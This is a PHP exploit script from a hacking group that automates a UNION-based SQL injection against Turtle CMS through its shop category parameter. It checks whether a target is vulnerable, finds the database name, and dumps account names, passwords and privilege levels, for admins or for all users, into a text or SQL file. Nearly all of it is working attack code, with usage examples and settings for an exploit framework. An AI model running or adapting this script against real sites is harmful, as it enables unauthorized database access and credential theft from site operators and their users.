<?php
//NOTE : - If you are using BHR put this file in \exploits\webapp folder
//       - BHR Download link => http://www.mediafire.com/?ij9rfpfw6s7uzxf (for windows only)
/* 
load exploits/webapp/turtle_injection.php
set HOST target
set MODE (1 for admin accounts/2 for all accounts)
set FILE (save format TXT/SQL)
exploit
 
 
!Turtle Injection
@ HOST = localhost = Target URL
@ PORT = 80 = Target Port
@ PATH = / = Web site path
@ MODE = 1 = Injection mode
@ FILE = sql = Save type
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
  
function http_send($host,$port, $packet)
{
    if (!($sock = fsockopen($host, $port)))
        die("\n[-] No response from {$host}:{$port}\n");
  
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
function write_txt($host, $file, $account, $pass, $level)
{
$save_file = fopen("".$file."", "a+"); 
fwrite($save_file, "$account:$pass:$level\n");
fclose($save_file);
}
function write_sql($file, $account, $pass, $level)
{
$save_file = fopen("".$file."", "a+");
fwrite($save_file, "INSERT INTO 'accounts' VALUES ('$account', '$pass', '$level')\n");
fclose($save_file);
}
function write($file, $account, $pass, $level)
{
if($file == "accounts.txt") 
write_txt($file, $account, $pass, $level); 
else
write_sql($file, $account, $pass, $level);
}
function fetch_data($page)
{
$debut = "~'";
$debutTxt = strpos( $page, $debut ) + strlen( $debut ); 
$fin = "'~";
$finTxt = strpos( $page, $fin ); 
$data_fetch = substr($page, $debutTxt, $finTxt - $debutTxt ); 
return $data_fetch;
}
function PostIt($host,$port,$path,$payload){
return file_get_contents("http://".$host.$path.$payload);

}
print "\n+-----------------------[ The Crazy3D Team ]--------------------------+";
print "\n| Turtle CMS SQL Injection Exploit                                    |";
print "\n|                                by The UnKn0wN                       |";
print "\n|     Greets to : The Crazy3D's members and all Algerian h4x0rs       |";
print "\n+---------------------------------------------------------------------+";
print "\n|                       www.rpg-exploit.com                           |";
print "\n+---------------------------------------------------------------------+\n";
  
if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <port> <path> <mode> <save>\n";
    print "\nExample....: php $argv[0] localhost 80 / 1 txt ";
    print "\nExample....: php $argv[0] localhost 80 /site/ 3 sql \n";
    die();
}
  
$host = $argv[1];
$port = $argv[2];
$path = $argv[3];
$mode = $argv[4];
$file = $argv[5];
  
if($file == "txt") $file = "accounts.txt";
else $file = "accounts.sql";
$inj_test = "'";
$inj_db = "99999999%20union%20all%20select%201,(select%20concat(0x7e,0x27,cast(database()%20as%20char),0x27,0x7e)),3,4,5,6,7,8--";
$payload = "index.php?pages=boutique&categorie=".$inj_test."";

if(!(preg_match("#mysql_num_rows#", postit($host,$port, $path,$payload)))) die ("[-] CMS not vulnerable\n");
else print ("[+] CMS can be exploited!\n");
$payload = "index.php?pages=boutique&categorie=".$inj_db."";
$db = fetch_data(PostIt($host,$port,$path,$payload));
if(empty($db)) die("[-] Can't find the database!\n");
print "[+] Database: ".$db."\n";
$db = str_replace(" ","%20",$db);
switch ($mode)
{
case 1:
$inj_count_accounts = "999999%20union%20all%20select%201,(select%20concat(0x7e,0x27,count(*),0x27,0x7e)%20FROM%20`{$db}`.accounts%20WHERE%20level>0),3,4,5,6,7,8--";

$payload = "index.php?pages=boutique&categorie=".$inj_count_accounts."";
$num = fetch_data(PostIt($host,$port,$path,$payload));

print "[+] Admin accounts: ".$num."\n";
for($i=0; $i<$num; $i++)
{
$inj_accounts = "999999%20union%20all%20select%201,(select%20concat(0x7e,0x27,account,0x2f,pass,0x2f,level,0x27,0x7e)%20FROM%20`{$db}`.accounts%20WHERE%20level>0%20LIMIT%20{$i},1),3,4,5,6,7,8--";
$payload = "index.php?pages=boutique&categorie=".$inj_accounts."";
$data = fetch_data(PostIt($host,$port,$path,$payload));
  
list($account, $pass, $level) = split('/', $data);
print "Account: {$account}\t Pass: {$pass}\t  Level: {$level}\n";
  
write($file, $account, $pass, $level);
}
break;
default:

$inj_count_accounts = "999999%20union%20all%20select%201,(select%20concat(0x7e,0x27,count(*),0x27,0x7e)%20FROM%20`{$db}`.accounts),3,4,5,6,7,8--";
$payload = "index.php?pages=boutique&categorie=".$inj_count_accounts."";
$num = fetch_data(PostIt($host,$port,$path,$payload));
print "[+] Accounts: ".$num."\n";
for($i=0; $i<$num; $i++)
{
$inj_accounts = "999999%20union%20all%20select%201,(select%20concat(0x7e,0x27,account,0x2f,pass,0x2f,level,0x27,0x7e)%20FROM%20`{$db}`.accounts%20LIMIT%20{$i},1),3,4,5,6,7,8--";
$payload = "index.php?pages=boutique&categorie=".$inj_accounts."";
$data = fetch_data(PostIt($host,$port,$path,$payload));
  
list($account, $pass, $level) = split('[/.-]', $data);
print "Account: {$account}\t Pass: {$pass}\t  Level: {$level}\n";
  write($file, $account, $pass, $level);

}
break; 
}
?>